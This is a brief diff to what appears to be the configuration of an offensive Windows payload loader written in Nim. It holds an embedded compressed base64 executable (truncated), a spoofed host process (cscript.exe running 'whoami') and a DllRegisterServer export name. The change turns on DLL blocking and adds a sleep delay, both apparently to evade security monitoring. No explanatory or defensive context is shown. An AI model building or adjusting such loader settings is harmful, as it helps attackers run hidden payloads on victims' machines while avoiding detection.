@@ -5,6 +5,6 @@ var compressedBase64PE* = protectString("H4sIAAAAAAAACty9eXwURfYA3nNBAgkdhUhWQAM
 var sponsorPath* = protectString(r"C:\Windows\System32\cscript.exe")
 var sponsorParams* = protectString(r" /c whoami.exe")
 var dllExportName* = protectString("DllRegisterServer") 
-var isBlockDlls* = false
-var sleepSeconds* = 0
+var isBlockDlls* = true
+var sleepSeconds* = 2
     
